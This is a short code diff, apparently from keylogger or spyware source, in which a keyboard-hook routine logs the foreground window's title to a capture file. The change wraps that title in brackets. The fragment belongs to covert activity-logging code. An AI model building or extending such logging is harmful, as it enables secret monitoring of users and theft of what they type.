@@ -41,9 +41,9 @@ VOID KBHook::process_hkdt(WPARAM w_param, LPARAM l_param)
 		{
 			const int ret = GetWindowTextA(new_hwnd, w_text, SPY_MAX_WTEXT_LTH);
 			LOG("window text is '%s'", w_text);
-			kbhfile->write("\n", 1);
+			kbhfile->write("\n[", 2);
 			kbhfile->write(w_text, ret);
-			kbhfile->write("\n", 1);
+			kbhfile->write("]\n", 2);
 			old_hwnd = new_hwnd;
 		}
 #endif
